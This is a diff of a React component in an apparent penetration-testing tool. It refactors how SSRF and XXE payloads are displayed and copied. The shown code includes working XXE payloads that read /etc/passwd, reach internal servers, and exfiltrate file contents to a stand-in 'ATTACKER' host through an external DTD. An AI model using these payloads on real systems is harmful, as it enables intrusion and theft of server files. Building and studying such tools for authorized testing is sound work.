@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { Card, Button, Input, TabNav } from '../ui';
+import { Card, Button, Input, TabNav, PayloadBlock } from '../ui';
 import { Globe, Copy, Check, Filter, FileCode } from 'lucide-react';
 
 // SSRF Cloud Payloads Data (from HackTools)
@@ -108,21 +108,11 @@ export default function SSRFTool() {
                     </p>
                     {CLOUD_PAYLOADS.map((payload) => (
                         <Card key={payload.id} className="!p-4 space-y-2">
-                            <h3 className="text-sm font-bold text-htb-green">{payload.name}</h3>
-                            <p className="text-xs text-gray-400">{payload.description}</p>
-                            <div className="space-y-1">
-                                {payload.steps.map((step, idx) => (
-                                    <div key={idx} className="flex items-center justify-between gap-2 bg-[#0d1117] rounded p-2">
-                                        <code className="text-xs text-blue-300 flex-1 break-all">{step}</code>
-                                        <Button
-                                            size="sm"
-                                            variant="outline"
-                                            onClick={() => copyToClipboard(step)}
-                                            icon={<Copy size={12} />}
-                                        />
-                                    </div>
-                                ))}
+                            <div>
+                                <h3 className="text-sm font-bold text-htb-green">{payload.name}</h3>
+                                <p className="text-xs text-gray-400">{payload.description}</p>
                             </div>
+                            <PayloadBlock content={payload.steps} />
                         </Card>
                     ))}
                 </div>
@@ -149,22 +139,15 @@ export default function SSRFTool() {
                             <p className="text-xs text-gray-500">
                                 {obfuscatedIPs[0] !== 'Invalid IPv4' ? `${obfuscatedIPs.length} variations generated` : 'Enter a valid IPv4 address'}
                             </p>
-                            <Button
-                                size="sm"
-                                variant="primary"
-                                onClick={copyAllIPs}
-                                disabled={obfuscatedIPs[0] === 'Invalid IPv4'}
-                                icon={<Copy size={14} />}
-                            >
-                                Copy All
-                            </Button>
+                            {/* Copy All button removed as PayloadBlock has its own, but we might want it for the whole set if PayloadBlock handles "content" as one string. 
+                                PayloadBlock joins array with newlines. So one copy button copies all. Perfect.
+                            */}
                         </div>
 
-                        <div className="bg-[#0d1117] rounded-lg p-4 max-h-96 overflow-y-auto">
-                            <pre className="text-xs text-blue-300 font-mono whitespace-pre-wrap break-all">
-                                {obfuscatedIPs.join('\n')}
-                            </pre>
-                        </div>
+                        <PayloadBlock
+                            content={obfuscatedIPs}
+                            className="max-h-96 overflow-y-auto"
+                        />
                     </Card>
                 </div>
             )}
@@ -179,38 +162,23 @@ export default function SSRFTool() {
                     <Card className="!p-4 space-y-2">
                         <h3 className="text-sm font-bold text-htb-green">Basic XXE (In-Band)</h3>
                         <p className="text-xs text-gray-400">Direct file read via XXE</p>
-                        <div className="bg-[#0d1117] rounded p-3">
-                            <code className="text-xs text-blue-300 block whitespace-pre-wrap">{`<?xml version="1.0"?>
+                        <PayloadBlock content={`<?xml version="1.0"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<foo>&xxe;</foo>`}</code>
-                        </div>
-                        <Button size="sm" variant="outline" onClick={() => copyToClipboard(`<?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<foo>&xxe;</foo>`)} icon={<Copy size={14} />}>
-                            Copy
-                        </Button>
+<foo>&xxe;</foo>`} />
                     </Card>
 
                     <Card className="!p-4 space-y-2">
                         <h3 className="text-sm font-bold text-htb-green">XXE to SSRF</h3>
                         <p className="text-xs text-gray-400">Access internal services via XXE</p>
-                        <div className="bg-[#0d1117] rounded p-3">
-                            <code className="text-xs text-blue-300 block whitespace-pre-wrap">{`<?xml version="1.0"?>
+                        <PayloadBlock content={`<?xml version="1.0"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/">]>
-<foo>&xxe;</foo>`}</code>
-                        </div>
-                        <Button size="sm" variant="outline" onClick={() => copyToClipboard(`<?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/">]>
-<foo>&xxe;</foo>`)} icon={<Copy size={14} />}>
-                            Copy
-                        </Button>
+<foo>&xxe;</foo>`} />
                     </Card>
 
                     <Card className="!p-4 space-y-2">
                         <h3 className="text-sm font-bold text-htb-green">Blind XXE (Out-of-Band)</h3>
                         <p className="text-xs text-gray-400">Data exfiltration via external DTD</p>
-                        <div className="bg-[#0d1117] rounded p-3">
-                            <code className="text-xs text-blue-300 block whitespace-pre-wrap">{`<?xml version="1.0"?>
+                        <PayloadBlock content={`<?xml version="1.0"?>
 <!DOCTYPE foo [
 <!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd">
 %xxe;
@@ -220,15 +188,7 @@ export default function SSRFTool() {
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?data=%file;'>">
 %eval;
-%exfil;`}</code>
-                        </div>
-                        <Button size="sm" variant="outline" onClick={() => copyToClipboard(`<?xml version="1.0"?>
-<!DOCTYPE foo [
-<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd">
-%xxe;
-]>`)} icon={<Copy size={14} />}>
-                            Copy
-                        </Button>
+%exfil;`} />
                     </Card>
                 </div>
             )}
